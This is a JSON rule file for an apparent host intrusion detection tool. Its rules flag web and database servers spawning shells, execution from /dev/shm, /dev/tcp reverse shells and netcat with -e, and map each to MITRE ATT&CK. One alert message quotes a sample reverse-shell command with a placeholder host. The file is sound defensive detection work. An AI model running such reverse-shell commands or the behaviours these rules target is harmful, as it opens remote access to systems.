{"schema_version":1,"rules":[
{"id":"alarm.web_server.shell","version":1,"title":"A web server started a shell","severity":"high","confidence":70,"kind":"process_event","programs":["sh","dash","bash","zsh","ksh","ash","busybox"],"expression":"(event['process.name'] == 'sh' || event['process.name'] == 'dash' || event['process.name'] == 'bash' || event['process.name'] == 'zsh' || event['process.name'] == 'ksh' || event['process.name'] == 'ash' || event['process.name'] == 'busybox') && ((event['parent.name'] == 'nginx' || event['parent.name'] == 'httpd' || event['parent.name'] == 'apache2' || event['parent.name'] == 'lighttpd' || event['parent.name'] == 'caddy') || event['parent.name'].startsWith('php-fpm'))","finding_message":"A web server process started a shell. That is how web shells and command injection usually look; legitimate CGI scripts are the common exception. Check the command line and the request that caused it.","attack":[{"tactic":"TA0003","technique":"T1505.003"},{"tactic":"TA0002","technique":"T1059.004"}]},
{"id":"alarm.database.shell","version":1,"title":"A database server started a shell","severity":"high","confidence":75,"kind":"process_event","programs":["sh","dash","bash","zsh","ksh","ash","busybox"],"expression":"(event['process.name'] == 'sh' || event['process.name'] == 'dash' || event['process.name'] == 'bash' || event['process.name'] == 'zsh' || event['process.name'] == 'ksh' || event['process.name'] == 'ash' || event['process.name'] == 'busybox') && (event['parent.name'] == 'mysqld' || event['parent.name'] == 'mariadbd' || event['parent.name'] == 'redis-server' || event['parent.name'] == 'mongod')","finding_message":"A database server process started a shell. These servers do not normally run shell commands; it is a common sign of an abused feature (a Redis module or config write, a MySQL UDF). Check the command line.","attack":[{"tactic":"TA0002","technique":"T1059.004"},{"tactic":"TA0001","technique":"T1190"}]},
{"id":"alarm.exec.dev_shm","version":1,"title":"A program ran from /dev/shm","severity":"high","confidence":80,"kind":"process_event","expression":"event['process.exe'].startsWith('/dev/shm/')","finding_message":"A program was executed from /dev/shm, a memory-backed directory anyone can write to. Software is not installed there; dropped payloads often are. Check the file and who started it.","attack":[{"tactic":"TA0005","technique":"T1564"},{"tactic":"TA0002","technique":"T1059.004"}]},
{"id":"alarm.shell.dev_tcp","version":1,"title":"A shell opened a network connection with /dev/tcp","severity":"critical","confidence":85,"kind":"process_event","programs":["sh","dash","bash","zsh","ksh"],"expression":"event['process.cmdline'].contains('/dev/tcp/') || event['process.cmdline'].contains('/dev/udp/')","finding_message":"A shell command line uses /dev/tcp or /dev/udp, the usual form of a reverse shell (for example bash -i >& /dev/tcp/HOST/PORT 0>&1). Check the command line and the connection's address.","attack":[{"tactic":"TA0002","technique":"T1059.004"},{"tactic":"TA0011","technique":"T1095"}]},
{"id":"alarm.netcat.exec","version":1,"title":"Netcat was started with a program to run","severity":"critical","confidence":80,"kind":"process_event","programs":["nc","ncat","netcat","nc.openbsd","nc.traditional"],"expression":"(event['process.name'] == 'nc' || event['process.name'] == 'ncat' || event['process.name'] == 'netcat' || event['process.name'] == 'nc.openbsd' || event['process.name'] == 'nc.traditional') && (event['process.cmdline'].contains(' -e') || event['process.cmdline'].contains(' --exec ') || event['process.cmdline'].contains(' --sh-exec '))","finding_message":"Netcat was started with -e, --exec or --sh-exec, which connects a program (usually a shell) to the network: a classic bind or reverse shell. Check the command line and the address.","attack":[{"tactic":"TA0011","technique":"T1095"},{"tactic":"TA0002","technique":"T1059"}]},
{"id":"alarm.openvibes.test","version":1,"title":"OpenVIBES test alarm","severity":"info","confidence":100,"kind":"process_event","programs":["openvibes-test"],"expression":"event['process.name'] == 'openvibes-test'","finding_message":"The OpenVIBES test program (openvibes-test alarm) ran; alarms work on this host."}
]}
